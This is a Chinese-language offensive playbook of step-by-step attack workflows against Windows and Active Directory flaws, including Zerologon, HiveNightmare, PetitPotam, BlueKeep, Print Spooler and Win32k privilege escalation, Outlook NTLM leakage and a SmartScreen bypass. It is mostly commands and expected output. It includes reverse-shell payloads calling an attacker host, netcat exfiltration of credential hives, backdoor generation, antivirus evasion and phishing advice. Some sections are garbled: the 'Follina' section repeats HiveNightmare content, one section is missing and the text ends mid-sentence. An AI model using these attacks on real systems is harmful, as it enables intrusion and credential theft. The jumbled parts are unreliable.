準備好 Python PoC：\
最常用的工具是 [impacket](https://github.com/SecureAuthCorp/impacket) 中的 `zerologon_tester.py`

```bash
python3 zerologon_tester.py <dc-name> <dc-ip>
```

輸出若為：

```
[+] <dc-ip> is vulnerable to Zerologon!
```

代表可以利用。

***

#### 3️⃣ 利用 Zerologon 重設機器帳戶密碼

```bash
python3 set_empty_pw.py <dc-name> <dc-ip>
```

成功會看到：

```
[+] Success! DC machine account password reset.
```

***

#### 4️⃣ Dump 出整個網域 hash

接下來使用 impacket-secretsdump 從 DC 取得密碼 hash：

```bash
impacket-secretsdump -just-dc <dc-name>$@<dc-ip> -no-pass
```

看到以下輸出：

```
[*] Dumping Domain Credentials (domain\user:rid:lmhash:nthash)
Administrator:500:aad3b4... :<NT hash> :::
```

***

#### 5️⃣ 利用取得的 Domain Admin hash

使用 Pass-the-Hash 攻擊，例如：

```bash
impacket-psexec <domain>/Administrator@<target-ip> -hashes :<ntlm-hash>
```

成功登入！

***

### 🛠 工具推薦

| 工具                         | 功能                   |
| -------------------------- | -------------------- |
| impacket-zerologon\_tester | 測試目標是否有 Zerologon 漏洞 |
| set\_empty\_pw.py (PoC)    | 利用漏洞將 DC 密碼置空        |
| impacket-secretsdump       | 從 DC 取得完整憑證 (hash)   |
| impacket-psexec / wmiexec  | 使用 hash 直接橫向移動攻擊     |

***

### 📥 成功攻擊輸出範例

```
[+] <dc-ip> is vulnerable to Zerologon!
[+] Password reset successful!
[*] Dumping Domain Credentials (domain\user:rid:lmhash:nthash)
Administrator:500:aad3b4... : NTLMHASH:::
```

並透過 `psexec` 成功取得 Shell：

```
C:\WINDOWS\system32> whoami
nt authority\system
```

***

### 🔎 Debug & 常見錯誤

| 問題                                | 解決方式                             |
| --------------------------------- | -------------------------------- |
| 輸出 `[!] Target is not vulnerable` | 確認是否為 DC、目標是否有補丁，或使用正確 DNS 名稱    |
| 重設密碼失敗                            | 使用多次嘗試，Zerologon 在低版本系統下偶爾需要多次嘗試 |
| Secretsdump 無法 dump               | 確認名稱解析（dc-name）、確保使用 -no-pass 模式 |





***

### ✅ 6️⃣ HiveNightmare (CVE-2021-36934) 本地攻擊流程 （完整範例）

> （之前已列出，這裡額外補上自動化範例腳本）🏢 公司化概念
>
> **HiveNightmare (CVE-2021-36934)** 是 Windows 系統中的一個嚴重本地權限提升漏洞。\
> 漏洞存在於系統的「註冊表配置單元 (SAM、SYSTEM、SECURITY)」存取權限設定錯誤。\
> 在預設情況下，BUILTIN\Users 群組對這些系統檔案具有可讀權限，加上系統卷影複本 (Volume Shadow Copy) 的存在，\
> 攻擊者可以在非管理員權限下輕鬆取得系統密碼哈希值，進一步透過離線破解或 Pass-The-Hash 攻擊取得系統最高權限。
>
> > 🚨 適用系統：Windows 10 (1809\~21H1)、部分 Windows Server 2019 版本未修補系統。
>
> ***
>
> ### 🚀 攻擊流程圖（文字版）
>
> ```
> 1️⃣ 檢查 SAM 檔案權限 & 確認是否易受攻擊
>      ↓
> 2️⃣ 確認存在 Shadow Copy
>      ↓
> 3️⃣ 使用 HiveNightmare PoC 抓取 SAM/SYSTEM/SECURITY 檔案
>      ↓
> 4️⃣ 將三個檔案傳回攻擊主機
>      ↓
> 5️⃣ 利用 secretsdump.py 解析本地密碼哈希
>      ↓
> 6️⃣ 使用破解工具（如 Hashcat）離線破解密碼或用 Pass-The-Hash 取得系統控制權
> ```
>
> ***
>
> ### 👨‍🏫 攻擊步驟範例
>
> #### 1️⃣ 檢查 SAM 權限
>
> ```powershell
> icacls C:\Windows\System32\config\SAM
> ```
>
> 範例輸出 (代表可利用)：
>
> ```
> C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
> ```
>
> ***
>
> #### 2️⃣ 檢查卷影副本 (Shadow Copy)
>
> ```powershell
> vssadmin list shadows
> ```
>
> 若出現：
>
> ```
> Shadow Copy ID: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
> ```
>
> 代表存在快照，可以進行攻擊。
>
> ***
>
> #### 3️⃣ 使用 HiveNightmare 工具
>
> 下載並執行現成 PoC 工具：
>
> ```powershell
> .\HiveNightmare.exe
> ```
>
> 輸出範例：
>
> ```
> Success: SAM hive from 2021-xx-xx written out to current working directory
> Success: SECURITY hive from 2021-xx-xx written out to current working directory
> Success: SYSTEM hive from 2021-xx-xx written out to current working directory
> ```
>
> 你會在當前資料夾看到：
>
> * SAM-YYYY-MM-DD
> * SYSTEM-YYYY-MM-DD
> * SECURITY-YYYY-MM-DD
>
> ***
>
> #### 4️⃣ 將檔案傳回攻擊機
>
> 透過 `scp`、`netcat` 或 `curl` 傳回本機備份保存。
>
> ***
>
> #### 5️⃣ 使用 secretsdump.py 抽取 Hash
>
> ```bash
> impacket-secretsdump -sam SAM-2021-xx-xx -system SYSTEM-2021-xx-xx -security SECURITY-2021-xx-xx local
> ```
>
> 範例結果：
>
> ```
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
> htb-user:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
> ```
>
> ***
>
> #### 6️⃣ 離線破解 or Pass-The-Hash
>
> **破解：**
>
> ```bash
> hashcat -m 1000 -a 0 <hash> rockyou.txt
> ```
>
> **Pass-The-Hash：**
>
> ```bash
> impacket-psexec -hashes :<NTLM-hash> Administrator@<victim-ip>
> ```
>
> ***
>
> ### 🛠 工具推薦

| 工具                        | 功能                                |
| ------------------------- | --------------------------------- |
| icacls                    | 檢查系統檔案權限                          |
| vssadmin                  | 檢查系統卷影副本                          |
| HiveNightmare.exe         | 自動從卷影複本中 dump SAM、SYSTEM、SECURITY |
| impacket-secretsdump      | 分析 hive 檔案並提取帳戶密碼 hash            |
| hashcat                   | 將 hash 離線破解                       |
| impacket-psexec / wmiexec | 使用 NTLM hash 執行橫向移動攻擊             |

> ***
>
> ### 📥 成功範例輸出
>
> ```
> Success: SAM hive from 2021-08-07 written out
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:....:<hash>:::
> ```
>
> Pass-The-Hash 成功登入：
>
> ```
> C:\Windows\System32> whoami
> nt authority\system
> ```
>
> ***
>
> ### 🛠 常見 Debug

| 問題                              | 解決方法                                             |
| ------------------------------- | ------------------------------------------------ |
| 執行 HiveNightmare.exe 沒反應        | 確認目標系統是否有 Shadow Copy，並檢查當前帳戶權限                  |
| secretsdump 出現 `key not found`  | 確認 SYSTEM、SAM、SECURITY 三個檔案都有匯出，且沒有損壞            |
| Hashcat 破解太慢                    | 使用 GPU 模式、改用 mask attack 針對常用弱密碼                 |
| 沒有卷影副本 `No shadow copies found` | 嘗試觸發系統備份或尋找其他本地提權漏洞 (如 PrintNightmare、HotPotato) |

***

### ✅ 7️⃣ Follina (CVE-2022-30190) 攻擊流程

### 🏢 公司化概念

**HiveNightmare (CVE-2021-36934)** 是 Windows 系統的一個嚴重本地提權漏洞。\
因系統將 **SAM、SYSTEM、SECURITY 註冊表配置單元** 設定為一般使用者可讀，加上有卷影複本 (VSS)，\
使得低權限攻擊者可從系統快照中擷取出本機帳號 Hash，\
透過 **離線破解** 或 **Pass-The-Hash** 方式取得 SYSTEM 權限並控制系統。

> ✅ **影響系統**：Windows 10 1809 \~ 21H1、部分 Windows Server 2019

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 檢查 SAM 權限 (icacls)
    ↓
2️⃣ 確認有 Shadow Copy (vssadmin)
    ↓
3️⃣ 使用 HiveNightmare PoC 擷取 hive 檔案
    ↓
4️⃣ 把 SAM、SYSTEM、SECURITY 檔案送回攻擊機
    ↓
5️⃣ 使用 secretsdump.py 分析取得 hash
    ↓
6️⃣ 利用 hashcat 破解或用 Pass-The-Hash 提權登入 SYSTEM
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 檢查 SAM 權限

```powershell
icacls C:\Windows\System32\config\SAM
```

範例結果（若有以下代表可攻擊）：

```
C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
```

***

#### 2️⃣ 檢查卷影副本（Shadow Copy）

```powershell
vssadmin list shadows
```

出現範例：

```
Shadow Copy ID: {xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}
```

表示系統有快照，可利用。

***

#### 3️⃣ 使用 HiveNightmare PoC 工具

將 PoC 放到目標主機執行：

```powershell
.\HiveNightmare.exe
```

範例輸出：

```
Success: SAM hive from 2021-xx-xx written out
Success: SYSTEM hive from 2021-xx-xx written out
Success: SECURITY hive from 2021-xx-xx written out
```

可在當前資料夾找到以下檔案：

```
SAM-YYYY-MM-DD
SYSTEM-YYYY-MM-DD
SECURITY-YYYY-MM-DD
```

***

#### 4️⃣ 將檔案傳回攻擊主機

範例使用 netcat：

```bash
nc -lvp 9999 > SAM-2021-xx-xx
nc -lvp 9998 > SYSTEM-2021-xx-xx
nc -lvp 9997 > SECURITY-2021-xx-xx
```

目標端：

```bash
nc <attack_ip> 9999 < SAM-2021-xx-xx
nc <attack_ip> 9998 < SYSTEM-2021-xx-xx
nc <attack_ip> 9997 < SECURITY-2021-xx-xx
```

***

#### 5️⃣ 使用 secretsdump.py 取得 Hash

```bash
impacket-secretsdump -sam SAM-2021-xx-xx -system SYSTEM-2021-xx-xx -security SECURITY-2021-xx-xx local
```

範例輸出：

```
Administrator:500:<LM-HASH>:<NTLM-HASH>:::
htb-user:1002:<LM-HASH>:<NTLM-HASH>:::
```

***

#### 6️⃣ 破解或 Pass-The-Hash

* 破解 Hash (使用 hashcat)：

```bash
hashcat -m 1000 -a 0 <NTLM-hash> rockyou.txt
```

* 使用 Hash 橫向移動 (Pass-The-Hash)：

```bash
impacket-psexec -hashes :<NTLM-hash> Administrator@<victim-ip>
```

***

### 🛠 常用工具一覽

| 工具名稱                      | 用途                                           |
| ------------------------- | -------------------------------------------- |
| icacls                    | 檢查系統檔案權限                                     |
| vssadmin                  | 查看系統卷影複本                                     |
| HiveNightmare.exe         | 從 Shadow Copy 自動 dump SAM、SYSTEM、SECURITY 檔案 |
| impacket-secretsdump.py   | 從 hive 檔案中取得本地帳號密碼雜湊                         |
| hashcat                   | 破解 NTLM 雜湊                                   |
| impacket-psexec / wmiexec | 使用雜湊或帳密在目標系統上取得遠端執行權限                        |

***

### 📥 成功案例範例

```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:....:<NTLM-HASH>:::
htb-user:1002:....:<NTLM-HASH>:::
```

Pass-The-Hash：

```
C:\Windows\System32> whoami
nt authority\system
```

***

### 🛠 常見問題與 Debug 指南

| 問題                           | 解決方法                                                   |
| ---------------------------- | ------------------------------------------------------ |
| 執行 HiveNightmare.exe 無反應     | 檢查 Shadow Copy 是否存在，並確認是否有執行權限                         |
| secretsdump 出現 key not found | 檢查 SAM、SYSTEM、SECURITY 三個檔案是否完整且無損壞                    |
| hashcat 破解速度過慢               | 使用 GPU 模式或改為規則化 mask 攻擊                                |
| 找不到 Shadow Copy              | 手動建立 Shadow Copy 或改利用其他漏洞（如 PrintNightmare、Hot Potato） |

***

### ✅ 8️⃣ PetitPotam (CVE-2021-36942) 攻擊流程

✅ **🏢 公司化概念：PetitPotam (CVE-2021-36942)**\
PetitPotam 是一種利用 **MS-EFSRPC (加密檔案系統遠端程序呼叫介面)** 中的漏洞，\
可以強制 Windows 伺服器（包含域控制器）將 NTLM 認證送出到攻擊者指定的伺服器，\
再透過 **NTLM Relay** 技巧中繼到 Active Directory Certificate Services (AD CS) 伺服器，\
讓攻擊者取得一張簽發給自己帳戶的 Kerberos 憑證 (TGT)，最終可以**取得域管理員權限**。

> 🚨 攻擊難度：中高（需要 AD 環境且 ADCS 未正確設定）\
> ✅ 適用範圍：Windows Server 各版本 + 啟用 AD CS\
> 🛡️ **影響範圍：全域 AD 環境若存在可被中繼的 AD CS 配置**

***

### 🚀 攻擊流程圖 (文字版)

```
pgsql複製編輯1️⃣ 確認目標 Windows Server/Domain Controller 存在 EFSRPC 介面 (可被呼叫)
     ↓
2️⃣ 檢查是否有 ADCS Web Enrollment 或 NTLM 身份驗證 API 可被中繼
     ↓
3️⃣ 建立 SMB 或 HTTP Relay Server (透過 impacket-ntlmrelayx)
     ↓
4️⃣ 使用 PetitPotam 工具向目標伺服器強制發送 NTLM 認證
     ↓
5️⃣ 攔截 NTLM 認證並中繼到 AD CS，請求憑證
     ↓
6️⃣ 取得 PFX 憑證並透過 Rubeus 或 certipy 載入，取得域管理員 TGT
     ↓
7️⃣ 使用 TGT 進行域控橫向滲透 (DCSync、RDP、Kerberoasting 等)
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 啟動 NTLM 中繼服務

使用 impacket-ntlmrelayx：

```bash
impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/ -smb2support --adcs --template <template_name>
```

* `-t`：指定中繼目標 (AD CS 伺服器)
* `--adcs`：告訴工具要與 ADCS 通訊
* `--template`：指定請求憑證用的範本，一般可以用 `User` 或 `Machine`

***

#### 2️⃣ 執行 PetitPotam 攻擊強迫伺服器送出 NTLM 認證

```bash
python3 petitpotam.py <DC_IP> <relay_server_IP>
```

範例：

```bash
python3 petitpotam.py 192.168.1.10 192.168.1.100
```

* `<DC_IP>` 為目標域控制器
* `<relay_server_IP>` 為攻擊者中繼伺服器（即 NTLMRelayx）

***

#### 3️⃣ 成功攔截與中繼

當攻擊成功時，`ntlmrelayx` 將會顯示：

```
[*] Authenticating against adcs server
[*] Successfully requested certificate
```

同時會產生 `.pfx` 憑證檔案，並保存於目錄下。

***

#### 4️⃣ 利用 certipy 取得 TGT

```bash
certipy auth -pfx <cert.pfx> -dc-ip <DC_IP> -username <domain_user>
```

範例：

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10 -username administrator
```

成功會顯示：

```
[*] Successfully authenticated as DOMAIN\Administrator
```

並在當前目錄中產生 `administrator.ccache`（TGT 憑證）。

***

#### 5️⃣ 使用 Rubeus 或 certipy 進行域控橫向攻擊

透過 TGT：

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass <domain>/<username>@<DC_IP>
```

可以執行 DCSync 並 dump 出整個域的帳號 hash。

***

### 🛠 常用工具推薦

| 工具名稱                 | 功能                                                            |
| -------------------- | ------------------------------------------------------------- |
| impacket-ntlmrelayx  | NTLM 中繼伺服器，支援 relay 到 ADCS                                    |
| petitpotam.py        | 強迫 Windows Server 對攻擊主機送出 NTLM 認證 (EFSRPC 攻擊)                 |
| certipy              | ADCS 憑證利用與 Kerberos 票據產生及認證                                   |
| Rubeus               | Windows Kerberos 操控工具，可載入憑證、執行 pass-the-ticket、ASREP Roasting |
| impacket-secretsdump | 域控橫向攻擊 DCSync 模組，dump 出所有域帳戶 hash                             |

***

### 📥 範例完整流程輸出

```
[*] Connecting to DC 192.168.1.10 and sending EFSRPC...
[*] Relay received NTLM authentication
[*] Successfully requested certificate
[*] Saved certificate as administrator.pfx
[*] Using certificate with certipy to get TGT...
[*] Successfully authenticated as DOMAIN\Administrator
[*] DCSync attack success! All domain hashes dumped.
```

***

### ⚠️ 常見錯誤與 Debug

| 問題                      | 解決方法                                                                 |
| ----------------------- | -------------------------------------------------------------------- |
| 中繼失敗 / 沒有收到認證請求         | 確認 DC 是否允許 EFSRPC 流量 (135 RPC port 必須開放)，確認防火牆狀態                     |
| ADCS template 找不到或無法簽憑證 | 使用 `certipy find -v -dc-ip <DC_IP>` 檢查 ADCS 設定與可用範本                  |
| 攻擊成功但 TGT 無法用           | 檢查憑證是否過期或 template 是否支援 Client Authentication，必要時改用 machine template |

***

### ✅ 9️⃣ BlueKeep (CVE-2019-0708) 攻擊流程

✅ **🏢 公司化概念：BlueKeep (CVE-2019-0708)**\
BlueKeep (CVE-2019-0708) 是一個存在於 Microsoft 遠端桌面服務（Remote Desktop Services, RDP）中的嚴重**遠端程式碼執行漏洞**，\
透過特製的 RDP 請求封包，攻擊者可以在未經身份驗證的情況下遠端執行任意程式碼，並以 SYSTEM 權限取得目標主機控制權。\
此漏洞屬於「蠕蟲型」漏洞，能自動橫向散播，嚴重程度可與 MS08-067/EternalBlue 相提並論。

> 🚨 適用系統：

* Windows 7、Windows XP
* Windows Server 2003、2008、2008 R2\
  （Windows 10 / Server 2016、2019 不受影響）

> 🎯 攻擊場景：

* 偵測到目標有開放 RDP (TCP 3389) 且無更新
* 可透過 Metasploit 或 Python Poc 進行遠端控制

***

### 🚀 攻擊流程圖 (文字版)

```
1️⃣ 使用 nmap / masscan 偵測目標是否開放 TCP 3389
    ↓
2️⃣ 使用 rdpscan 或 msf 模組確認是否易受 CVE-2019-0708 攻擊
    ↓
3️⃣ 利用 Metasploit or 公開 Poc 對目標發送特製封包
    ↓
4️⃣ 取得目標機器 SYSTEM 權限的 shell
    ↓
5️⃣ 維穩後可進行橫向滲透 (如 Dump hash / RDP 使用)
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 偵測目標 RDP

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target_ip>
```

（`ms12-020` script 通常同樣可確認 RDP 是否存在協定弱點）

或用 masscan 快速掃描：

```bash
masscan -p3389 <target_subnet> --rate 10000
```

***

#### 2️⃣ 驗證是否為易受攻擊版本

可以使用 rdpscan：

```bash
rdpscan <target_ip>
```

成功回傳易受攻擊標誌：

```
VULNERABLE: Host is vulnerable to BlueKeep (CVE-2019-0708)
```

***

#### 3️⃣ 使用 Metasploit 攻擊範例

開啟 Metasploit：

```bash
msfconsole
```

載入模組：

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

設定參數：

```bash
set RHOSTS <target_ip>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```

成功後可得到：

```
[*] Sending stage (206403 bytes) to <target_ip>
[*] Meterpreter session 1 opened
```

***

#### 4️⃣ 確認權限

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

***

#### 5️⃣ Dump hash 或進行橫向

```bash
meterpreter > hashdump
```

或使用 RDP 直接進行登入（若目標允許）。

***

### 🛠 工具推薦清單

| 工具名稱             | 功能                                     |
| ---------------- | -------------------------------------- |
| nmap             | 偵測 RDP 開放與簡易弱點掃描                       |
| masscan          | 大範圍掃描 TCP 3389                         |
| rdpscan          | 專門掃描 BlueKeep 脆弱性                      |
| Metasploit       | 提供 cve\_2019\_0708\_bluekeep\_rce 攻擊模組 |
| Nessus / Nexpose | 專業漏洞掃描，可確認大規模 RDP 弱點                   |

***

### 📥 成功範例輸出

```
[*] Started reverse TCP handler on 10.10.14.3:4444
[*] 10.10.10.5:3389 - Sending BlueKeep RDP protocol request...
[*] Sending payload
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.5:49158) at 2023-11-05 14:05:55 +0000
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

***

### ⚠️ 常見錯誤與 Debug

| 問題                     | 解決方法                                               |
| ---------------------- | -------------------------------------------------- |
| Payload 傳送後無回應 / Crash | BlueKeep 容易造成系統 BSOD，需嘗試低速傳送或降低 attack attempts 設定 |
| 遠端被防火牆封鎖               | 考慮搭配內網滲透後轉發 port 3389 或以其他方式繞過防火牆                  |
| 遇到 patched 主機          | 嘗試其他提權或滲透方式，如 MS17-010 或 ADCS 攻擊                   |

```
確認 Exchange 存在漏洞版本 → SSRF 要求 → 執行 RCE → 取得 shell
```

#### 工具範例：

* 開源 exploit Python script



### ✅ 1️⃣1️⃣ CVE-2022-21999 (Print Spooler 提權漏洞)

#### 🏢 公司化概念

CVE-2022-21999 是 Windows Print Spooler 服務中的本地權限提升漏洞，俗稱「Print Spooler EoP」，可以讓低權限使用者透過**惡意列印任務**與 DLL 劫持，最終將自身權限提升為 SYSTEM。

此漏洞出現於**Windows 10、Windows 11、Windows Server 2016/2019/2022**（未更新情況下特別危險）。\
許多企業因為需要持續啟用 Print Spooler，無法全面關閉，反而使此漏洞成為攻擊者最佳進場點之一。

***

### 🚀 CVE-2022-21999 攻擊流程圖（文字版）

```
1️⃣ 確認目標為 Windows 且 Print Spooler 服務運行中
       ↓
2️⃣ 利用漏洞建立「惡意列印任務」
       ↓
3️⃣ 透過 DLL 劫持將惡意 DLL 上傳至特定目錄
       ↓
4️⃣ Spooler 在 SYSTEM 權限下執行 DLL
       ↓
5️⃣ 攻擊者獲得 SYSTEM 權限反向 shell
```

***

### 👨‍🏫 攻擊步驟範例

***

#### 1️⃣ 確認 Print Spooler 是否運行

```powershell
Get-Service spooler
```

✅ 如果看到：

```
Status   Name               DisplayName
------   ----               -----------
Running  spooler            Print Spooler
```

代表可繼續攻擊。

***

#### 2️⃣ 確認漏洞存在

透過 nmap NSE script：

```bash
nmap -p 445 --script=smb-vuln-ms-printer <目標IP>
```

> 出現結果提示「可能存在漏洞」，即可進行下一步。

***

#### 3️⃣ 建立惡意 DLL

產生反向連線 shell：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<攻擊機IP> LPORT=443 -f dll > evil.dll
```

***

#### 4️⃣ 上傳惡意 DLL

將 DLL 上傳至目標，放在 `C:\Windows\System32\spool\drivers\x64\3\`\
（或透過 PowerShell 傳檔）

***

#### 5️⃣ 啟動 Metasploit 等待連線

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <攻擊IP>
set LPORT 443
run
```

***

#### 6️⃣ 觸發漏洞

透過 PowerShell 匯入並執行 PoC 腳本（Github 上有公開 PoC）：

```powershell
Import-Module .\CVE-2022-21999.ps1
Invoke-PrintSpoolerEoP -DllPath "C:\Windows\System32\spool\drivers\x64\3\evil.dll"
```

***

#### 7️⃣ 接收 SYSTEM 權限

Metasploit 將回傳會話：

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> 權限提升成功！

***

### ⚡️ Debug 小技巧

| 問題            | Debug 方法                        |
| ------------- | ------------------------------- |
| 沒有連線回傳        | 確認 DLL 放在正確路徑 & LHOST 是否為可達地址   |
| DLL 載入失敗      | 檢查 DLL 是否 64 位元 且 msfvenom 參數正確 |
| Spooler 服務未執行 | 使用 `Start-Service spooler` 重啟服務 |

***

### ✅ 1️⃣2️⃣ CVE-2023-28252 (Win32k 提權漏洞)

### 🏢 公司化概念

CVE-2023-28252 是 2023 年 3 月由微軟公告的「Win32k 提權漏洞」，這是一個本地提權漏洞（Local Privilege Escalation, LPE），\
它允許低權限用戶透過惡意設計的驅動或 API 呼叫，利用 win32k.sys 核心模組中的權限驗證缺陷，將自身權限提升為 SYSTEM。

⚠️**APT（進階持續性攻擊）組織已在野使用此漏洞**，特別是在針對企業內部網路滲透中利用頻率極高。\
主要影響範圍：

* Windows 10（部分版本）
* Windows 11
* Windows Server 2019/2022

***

### 🚀 CVE-2023-28252 攻擊流程圖（文字版）

```
1️⃣ 確認目標系統與版本（10 / 11 / Server）
       ↓
2️⃣ 檢查是否安裝 2023 年 4 月前更新（漏洞存在）
       ↓
3️⃣ 上傳已編譯好的本地提權 exploit（二進位執行檔）
       ↓
4️⃣ 利用當前低權限帳號執行 Exploit
       ↓
5️⃣ 取得 NT AUTHORITY\SYSTEM 權限
       ↓
6️⃣ Dump 系統 Hash / 持久化後門 / 搶取 AD 資訊
```

***

### 👨‍🏫 攻擊步驟範例

***

#### 1️⃣ 確認系統版本

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

或者：

```powershell
ver
```

> 確認版本屬於 Win10/11/Server 且 2023 年 4 月更新前，屬於易受攻擊目標。

***

#### 2️⃣ 搜尋已安裝更新

```powershell
Get-Hotfix | Sort-Object InstalledOn -Descending
```

> 如果沒有 `KB5025221` 或 2023 年 4 月後安全更新，表示漏洞存在。

***

#### 3️⃣ 上傳 Exploit

Github 上已有公開 PoC 或是可透過 exploit-db 下載 C/C++ 程式碼並在本地編譯成 .exe。\
（或使用已知 exploit 如【CVE-2023-28252.exe】）

***

#### 4️⃣ 在受害者主機執行

```powershell
C:\Users\user\Desktop\CVE-2023-28252.exe
```

執行成功畫面範例：

```
[+] Exploit triggered
[+] Privilege escalated: NT AUTHORITY\SYSTEM
```

***

#### 5️⃣ 驗證 SYSTEM 權限

```cmd
whoami
```

會看到：

```
nt authority\system
```

***

#### 6️⃣ 搶取密碼 Hash

```cmd
mimikatz.exe
sekurlsa::logonpasswords
```

或

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

***

### ⚡️ 如果錯誤如何 Debug？

| 問題              | 解決方向                                                     |
| --------------- | -------------------------------------------------------- |
| 無法提權 / 沒有回應     | 確認是否為 2023 年 4 月以前未更新系統                                  |
| 執行失敗，顯示「受限」     | 確認使用者帳號是否有基本執行程式的權限                                      |
| 程式被 Defender 阻擋 | 先繞過防毒（使用 `msfvenom -e x86/shikata_ga_nai` 編碼器）或利用 lolbin |

* CVE-2023-28252 POC（由 researcher 公開）
* Metasploit 外掛

#### 範例步驟：

```bash
use exploit/windows/local/cve_2023_28252_win32k
set SESSION <session number>
set LHOST <your-ip>
exploit
```

#### Debug 方法：

* 確認目標為 Windows 10 21H2 或 Windows 11
* 如果失敗，嘗試改用 PowerShell 腳本 exploit

***

### ✅ 1️⃣3️⃣ CVE-2023-23397 (Outlook NTLM 洩漏)

### 🏢 公司化概念

CVE-2023-23397 是 2023 年 3 月微軟公告的「Outlook NTLM 哈希洩漏漏洞」，屬於 **零互動漏洞（Zero-Click Vulnerability）**。\
攻擊者只需要透過向目標寄送特製 Outlook 行事曆邀請（透過 MAPI 協定）或惡意郵件，即可觸發 Outlook 對攻擊者指定的 SMB 分享路徑發出 NTLM 認證請求，進而造成 NTLM hash 洩漏。

**影響範圍**：

* Outlook 桌面版（Windows）
* Windows Server 上的 Outlook 安裝
* 影響版本：2013、2016、2019、Outlook for Microsoft 365

> ✅**APT 團隊已廣泛利用，特別針對大型企業、政府機構內部進行憑證竊取與後續 lateral movement 攻擊**。

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 確認目標公司使用 Outlook 桌面版
       ↓
2️⃣ 架設惡意 SMB Server（可使用 responder）
       ↓
3️⃣ 製作惡意 Outlook 行事曆邀請 / 郵件，含 UNC 路徑 (\\attacker-ip\share)
       ↓
4️⃣ 目標開啟 Outlook 或同步，即觸發 NTLM 認證洩漏
       ↓
5️⃣ 捕獲 NTLM 哈希
       ↓
6️⃣ 雜湊暴力破解或利用 NTLM relay
```

***

### 👨‍🏫 攻擊步驟範例

***

#### 1️⃣ 攻擊者先架設 SMB 捕捉伺服器

```bash
responder -I eth0 -wrf
```

> * `-I` 指定介面
> * `-wrf` 同時攔截網頁、DNS、SMB 等請求

***

#### 2️⃣ 製作 Outlook 行事曆邀請

你可以用 Powershell 產生惡意 `msg` 檔案，也可以透過 `Python` 腳本自動產生。

範例：

```powershell
New-Item -ItemType File -Path "exploit.ics" -Value @"
BEGIN:VCALENDAR
BEGIN:VEVENT
SUMMARY:Hacker Meeting
LOCATION:\\10.10.14.5\share
DTSTART;TZID=America/New_York:20230323T090000
DTEND;TZID=America/New_York:20230323T100000
END:VEVENT
END:VCALENDAR
"@
```

> 將檔案寄送給目標，或透過社交工程引導目標點擊。

***

#### 3️⃣ 等待目標觸發

當目標使用 Outlook 開啟行事曆或同步帳號時，即會嘗試連線到指定 UNC 路徑，Responder 會出現下列畫面：

```
[SMB] NTLMv2-SSP Client   : 10.10.10.25
[SMB] NTLMv2-SSP Hash    : DOMAIN\User::DOMAIN:...
```

***

#### 4️⃣ 破解 NTLM 哈希（可選）

使用 hashcat 嘗試暴力破解：

```bash
hashcat -m 5600 captured.hash rockyou.txt
```

> `-m 5600` 為 NTLMv2 模式

***

### ⚡️ 如果不成功如何 Debug？

| 問題                | 解決方向                           |
| ----------------- | ------------------------------ |
| Outlook 沒有觸發連線    | 確認路徑格式是否為 `\\IP\share`，IP 是否可達 |
| Responder 沒有收到哈希  | 確保目標沒有使用 Proxy，並且沒有阻擋 SMB 流量   |
| 沒有登入 Outlook 就不觸發 | 社交工程誘導開啟 Outlook 或重新啟動電腦       |

***

### ✅ 1️⃣4️⃣ CVE-2023-24880 (SmartScreen Bypass)

### 🏢 公司化概念

CVE-2023-24880 是一個繞過 Windows SmartScreen 保護機制的漏洞。\
SmartScreen 是微軟提供的「惡意下載防護機制」，會對可疑可執行檔（如 .exe、.msi、.lnk）彈出警告視窗。

> ⚠ 這個漏洞允許攻擊者製作一個 **「已簽章」但繞過 SmartScreen 的惡意檔案」**，一旦受害者執行此檔案，Windows 不會跳出「此檔案來自未知來源，可能危險」的提示。

此漏洞已經被多個 APT 團隊及惡意軟體開發者（如 infostealer、銀行木馬）大量利用，特別容易在 **釣魚信件附加檔案、偽造企業更新包** 中出現。

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 攻擊者製作惡意 payload（msi / exe）
       ↓
2️⃣ 利用 CVE-2023-24880 打包為 SmartScreen-bypass 可執行檔
       ↓
3️⃣ 社交工程寄送（釣魚信 / USB drop）
       ↓
4️⃣ 目標點擊時 SmartScreen 不會警告
       ↓
5️⃣ Payload 執行，取得控制
```

***

### 👨‍🏫 攻擊步驟範例

***

#### 1️⃣ 製作惡意 payload

使用 msfvenom：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe -o backdoor.exe
```

***

#### 2️⃣ 利用漏洞工具製作繞過檔案

> Github 上有 PoC 程式碼（例如由 Will Dormann 提供），可用 Python 生成特殊「Signed .MSI」格式：

```bash
python3 SmartScreenBypassGenerator.py --input backdoor.exe --output bypass.msi
```

> 工具會自動加入特定屬性讓 SmartScreen 無法檢測。

***

#### 3️⃣ 測試（本機）

> 直接雙擊執行 `bypass.msi`，

